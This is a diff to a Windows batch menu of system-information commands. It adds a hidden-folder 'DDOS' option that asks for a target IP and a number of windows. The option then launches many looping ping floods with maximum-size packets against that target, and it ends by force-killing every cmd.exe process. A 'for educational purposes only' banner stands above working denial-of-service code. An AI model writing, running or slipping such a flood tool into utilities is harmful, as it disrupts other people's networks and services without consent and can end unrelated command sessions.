@@ -110,6 +110,7 @@ echo 97. Show Windows update history
 echo 98. List installed printers
 echo 99. Display system boot config
 echo 100. Show Windows event logs
+echo 101. DDOS USE AT OWN RISK
 echo.
 set /p q=Enter your choice (1-100): 
 
@@ -213,6 +214,7 @@ if "%q%"=="97" goto showwinupdatehistory
 if "%q%"=="98" goto listinstalledprinters
 if "%q%"=="99" goto displaysysbootconfig
 if "%q%"=="100" goto showwineventlogs
+if "%q%"=="101" goto DDOS
 goto x
 
 :knowyourip
@@ -723,4 +725,60 @@ wevtutil el
 pause
 goto x
 
+@echo off
 
+:DDOS
+cls
+chcp 65001 > nul
+color d
+
+echo ████████▄  ████████▄   ▄██████▄     ▄████████ 
+echo ███   ▀███ ███   ▀███ ███    ███   ███    ███ 
+echo ███    ███ ███    ███ ███    ███   ███    █▀  
+echo ███    ███ ███    ███ ███    ███   ███        
+echo ███    ███ ███    ███ ███    ███ ▀███████████ 
+echo ███    ███ ███    ███ ███    ███          ███ 
+echo ███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
+echo ████████▀  ████████▀   ▀██████▀   ▄████████▀ 
+pause
+echo ___________________________________________________________
+echo   
+echo               FOR EDUCATIONAL PURPOSES ONLY 
+echo ___________________________________________________________
+echo 			USE AT OWN RISK
+echo           I AM NOT RESPONSIBLE FOR YOUR ACTIONS
+
+
+if exist %userprofile%\key goto skip
+  cls
+  echo verifiedbypass>%userprofile%\key
+  md %temp%\DDOST\
+  md %userprofile%\.ddost\
+  md %userprofile%\.ddost\data\
+  attrib +h %temp%\DDOST\
+
+:skip
+  echo IP:
+  set /p ip=
+    cls
+      echo Amount of windows:
+  set /p windows=
+    cls
+      echo @echo off>>"%temp%\DDOST\run.bat"
+      echo :loop>>"%temp%\DDOST\run.bat"
+      echo ping %ip% -n 1 -l 65500>>"%temp%\DDOST\run.bat"
+      echo goto loop>>"%temp%\DDOST\run.bat"
+      echo Minimize Windows (Y/N):
+  set /p mintf=
+    cls
+      if "%mintf%"=="Y" set mintf=/min
+      if "%mintf%"=="N" set mintf=
+
+for /l %%A in (1,1,%windows%) do start %mintf% "cmd.exe" "%temp%\DDOST\run.bat"
+echo Press any button to exit
+  pause >nul
+    del /q "%temp%\DDOST\run.bat"
+    timeout /t 1
+    taskkill /f /t /im cmd.exe
+pause
+goto x
